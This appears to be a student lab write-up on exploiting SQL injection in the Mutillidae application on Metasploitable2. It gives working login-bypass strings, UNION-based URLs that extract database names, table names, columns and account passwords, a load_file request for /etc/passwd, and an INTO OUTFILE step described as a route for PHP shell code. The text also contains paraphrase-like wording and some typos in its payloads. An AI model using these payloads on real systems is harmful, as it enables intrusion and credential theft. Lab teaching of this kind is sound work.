# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/7a5b1b0b-c196-4458-a2bd-dba8737a788b" />

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/3bd676f0-7426-4266-98dd-17d91bd03973" />

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/86ac19e9-8e08-40e2-ad0e-c9f43b74d84c" />

Click on the menu Login/Register and register for an account
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/8d87f019-1934-41ab-8693-d7d5bcc75363" />

Click on the link “Please register here”
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/f2f327ce-e022-41ce-81d5-8067b69264be" />

Click on “Create Account” to display the following page:
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/75d867c0-4090-4338-80d4-ee308012b1c2" />


The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page. Click “Login”. 
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/17f2ddcb-829b-4fb0-a8c0-a2532e8e2d2c" />

## Bypassing login field

The username field is vulnerable. Put (blaise’ #) or (blaise’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “blaise.”
Now after logging out you will see the login page. In the login page give blaise’ # . You can see the page now enters into the administrator page as before when giving the password.
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/c4f4e507-4837-4abc-b8a7-cea456892295" />

Click the login button and you will see it enter into the administrator page
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/4a82518d-4a68-4ec1-98cf-e68918ab3b7a" />

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/79455fec-9807-4697-b09d-c8456a6029d2" />
<img width="400" alt="image" src="https://github.com/user-attachments/assets/26ee1e6c-137c-4891-894c-cf855b31c909" />
<img width="400" alt="image" src="https://github.com/user-attachments/assets/14a7f703-9a5a-4214-a395-30a2eded90ac" />
<img width="400" alt="image" src="https://github.com/user-attachments/assets/673450b4-ec03-4ee0-9164-dc8e73cded34" />

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/90acb007-78d3-45e7-8b07-843559057c57" />

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27%order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/29c13521-0b08-4483-a5d3-71fa42d50882" />

After adding the order by 6 into the existing url , the following error statement will be obtained:
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/13a4423b-cf55-437b-b182-1f6d67df546c" />

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/d37ef66c-256e-4a92-976f-8b319c09f19e" />

 As it is having 5 columns the query worked fine and it provides the correct result
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/1afd28d7-ba53-46a0-8f5d-fcb92345ea64" />

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/fe9dcc4c-da27-400f-8694-e4386451039d" />

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/6022edba-cb8d-4490-af75-19093652b06c" />

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/faee3c63-caff-4cb9-8736-086ac75ee443" />

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/85e95ff5-3ce8-41a0-9e16-e68bfaddb18a" />
<img width="400" alt="image" src="https://github.com/user-attachments/assets/6632160b-5cb8-4ad9-95bc-cabfd22c6438" />


The url once executed will  retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

The column names of the accounts is displayed below for the following url:
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/f2ee55f2-9b73-4ec7-8afb-0897503a31bc" />

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/21abf81d-e047-4793-a284-08fa17ecef5e" />

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
<img width="400" alt="image" src="https://github.com/user-attachments/assets/44300184-8a22-4802-88f0-f4e07d31d8bf" />

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
